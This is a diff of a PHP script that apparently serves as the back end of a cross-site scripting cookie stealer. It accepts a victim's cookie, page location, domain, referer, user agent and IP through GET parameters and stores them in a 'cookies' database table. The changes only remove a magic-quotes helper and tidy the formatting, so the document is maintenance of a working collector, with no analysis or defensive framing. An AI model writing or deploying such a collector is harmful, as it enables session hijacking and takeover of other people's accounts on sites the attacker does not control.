@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 @header("Content-Type:text/html;charset=utf-8");
 @require('mysql.class.php');
 
@@ -33,48 +33,35 @@ function get_referer(){
     return $_SERVER['HTTP_REFERER'];
 }
 
-function quotes($content){
-    if(get_magic_quotes_gpc()){
-        if(is_array($content)){
-            foreach($content as $key=>$value){
-                $content[$key] = stripslashes($value);
-            }
-        }else{
-            $content = stripslashes($content);}
-    }else{}
-    return $content;
-}
-
-
 $date       = time();
-$ip         = htmlspecialchars(quotes(get_real_ip()));
-$screen     = htmlspecialchars(quotes($_GET['screen']));
-$browser    = htmlspecialchars(quotes($_GET['browser']));
-$flash      = htmlspecialchars(quotes($_GET['flash']));
-$ua         = htmlspecialchars(quotes($_GET['ua']));
-$domain     = htmlspecialchars(quotes($_GET['domain']));
-$title      = htmlspecialchars(quotes($_GET['title']));
-$lang       = htmlspecialchars(quotes($_GET['lang']));    
-$referer    = htmlspecialchars(quotes($_GET['referer']));
-$location   = htmlspecialchars(quotes($_GET['location']));
-$toplocation= htmlspecialchars(quotes($_GET['toplocation']));
-$cookie     = htmlspecialchars(quotes($_GET['cookie']));
+$ip         = htmlspecialchars(get_real_ip());
+$screen     = htmlspecialchars($_GET['screen']);
+$browser    = htmlspecialchars($_GET['browser']);
+$flash      = htmlspecialchars($_GET['flash']);
+$ua         = htmlspecialchars($_GET['ua']);
+$domain     = htmlspecialchars($_GET['domain']);
+$title      = htmlspecialchars($_GET['title']);
+$lang       = htmlspecialchars($_GET['lang']);
+$referer    = htmlspecialchars($_GET['referer']);
+$location   = htmlspecialchars($_GET['location']);
+$toplocation= htmlspecialchars($_GET['toplocation']);
+$cookie     = htmlspecialchars($_GET['cookie']);
 
 $db = new mysql();
 $arr = array();
-$arr['date']        = $date;
-$arr['ip']          = $ip;
-$arr['screen']      = $screen;
-$arr['browser']     = $browser;
-$arr['flash']       = $flash;
-$arr['useragent']   = $ua;
-$arr['domain']      = $domain;
-$arr['title']       = $title;
-$arr['lang']        = $lang;
-$arr['referer']     = $referer;
-$arr['location']    = $location;
+$arr['date'] = $date;
+$arr['ip'] = $ip;
+$arr['screen'] = $screen;
+$arr['browser'] = $browser;
+$arr['flash'] = $flash;
+$arr['useragent'] = $ua;
+$arr['domain'] = $domain;
+$arr['title'] = $title;
+$arr['lang'] = $lang;
+$arr['referer'] = $referer;
+$arr['location'] = $location;
 $arr['toplocation'] = $toplocation;
-$arr['cookie']      = $cookie;
+$arr['cookie'] = $cookie;
 $db->insert('cookies',$arr);
 
 ?>
